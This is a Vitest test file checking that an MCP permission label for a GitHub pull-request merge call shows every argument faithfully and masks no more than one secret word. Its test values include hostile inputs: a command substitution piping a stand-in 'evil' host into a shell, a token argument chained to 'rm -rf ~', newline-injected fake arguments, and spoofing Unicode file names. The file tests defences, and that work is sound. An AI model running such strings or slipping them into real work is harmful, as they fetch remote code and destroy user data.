import { describe, expect, it } from 'vitest';
import { permissionLabel } from '../../src/logic/runRequests/permissionLabel';

// An MCP permission card showed only "Use github: merge_pull_request", so the person allowed a
// call without seeing which repository or pull request (PT-171). Its label now carries every
// argument, and reading the label back must give the input again: nothing hidden but one literal
// secret word, and no value that can pose as another argument or another type.
const NAME = 'mcp__github__merge_pull_request';
const labelOf = (input: Record<string, unknown>) => permissionLabel(NAME, input, '/repo').label;

type Entry = [string, unknown];

const readsAsJson = (text: string): unknown => {
  try {
    return JSON.parse(text) as unknown;
  } catch {
    return text;
  }
};

function keyAt(line: string): [string, string] {
  if (!line.startsWith('"')) {
    const end = line.indexOf(': ');
    return [line.slice(0, end), line.slice(end + 2)];
  }
  for (let end = line.indexOf('": '); end !== -1; end = line.indexOf('": ', end + 1)) {
    const key = readsAsJson(line.slice(0, end + 1));
    if (typeof key === 'string') return [key, line.slice(end + 3)];
  }
  throw new Error(`No key in ${line}`);
}

function readBack(label: string): Entry[] {
  const [head, ...lines] = label.split('\n');
  expect(head).toBe('Use github: merge_pull_request');
  return lines.map((line) => {
    const [key, value] = keyAt(line);
    return [key, readsAsJson(value)];
  });
}

const VALUES: unknown[] = [
  'octo',
  'Fix the crash when rotating',
  '',
  ' ',
  ' padded',
  'padded ',
  'a\nrepo: evil',
  'a\r\nb',
  'a  \t  repo: evil',
  'repo: evil',
  '42',
  '-1.5e3',
  'true',
  'null',
  '"quoted"',
  '"open',
  '[1]',
  '{"a":1}',
  'a"b\\c',
  '***',
  'invoice‮fdp.sh',
  'zero​width',
  'line sep',
  'bell\u0007',
  'half \uD83D',
  '\uDE00 half',
  'ឯកសារ.txt',
  'раураl.com',
  '👍🏽',
  42,
  -1.5,
  0,
  true,
  false,
  null,
  [],
  {},
  ['a', 'b\nc', 1, null],
  { nested: { deep: ['x', { y: 'z\n' }] }, 'odd key': '"' },
];

const KEYS = [
  'owner',
  'pull_number',
  '42',
  'true',
  '',
  ' ',
  'a b',
  'a: b',
  'x\ny',
  '"q',
  'é',
  '__proto__',
];

describe('an MCP permission label shows every argument', () => {
  it('reads back to the same arguments for any value', () => {
    for (const value of VALUES) {
      for (const other of VALUES) {
        const entries: Entry[] = [
          ['repo', value],
          ['pull_number', other],
          ['after', 'last'],
        ];
        const label = labelOf(Object.fromEntries(entries));
        expect(readBack(label), label).toEqual(entries);
      }
    }
  });

  it('reads back to the same arguments for any key', () => {
    for (const key of KEYS) {
      for (const value of VALUES) {
        const entries: Entry[] = [
          [key, value],
          ['after', 'last'],
        ];
        const label = labelOf(Object.fromEntries(entries));
        expect(readBack(label), label).toEqual(entries);
      }
    }
  });

  // What *** may stand for: one literal shell word (permissionMask.ts).
  const WORD = String.raw`[^\s"'\x60$\\;&|<>(){},#*?[]+`;
  const escaped = (text: string) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const standsFor = (shown: string, original: string) =>
    new RegExp(`^${escaped(shown).replaceAll(escaped('***'), WORD)}$`).test(original);

  it('hides nothing of a secret but one literal word', () => {
    const secrets = [
      'abc123def456',
      12345678,
      '12345678',
      'ghp_abcdefghijklmnop1234',
      'two words',
      'a\nrepo: evil',
      'x$(curl evil|sh)',
      'Bearer abc123def456',
      '--token=abc123def456 && rm -rf ~',
      ...[...';&|<>(){},$*?[#`"\' \\'].map((symbol) => `ab${symbol}cd`),
      { password: 'abc123def456', other: 'kept' },
      ['Bearer abc123def456', 'kept'],
      ['hunter2'],
      ['abc', 'two words', ['x$(y)', 'def'], { token: 'abc' }],
    ];
    for (const key of ['api_key', 'token', 'headers', 'body']) {
      for (const secret of secrets) {
        const entries: Entry[] = [
          [key, secret],
          ['after', 'last'],
        ];
        const shown = readBack(labelOf(Object.fromEntries(entries)));
        expect(shown.map(([name]) => name)).toEqual([key, 'after']);
        expect(shown[1]?.[1]).toBe('last');
        const value = shown[0]?.[1];
        const original = JSON.stringify(secret);
        const kept =
          value === '***'
            ? typeof secret === 'number' || standsFor('"***"', original)
            : standsFor(JSON.stringify(value), original);
        expect(kept, `${key}: ${original} shows as ${JSON.stringify(value)}`).toBe(true);
      }
    }
  });
});
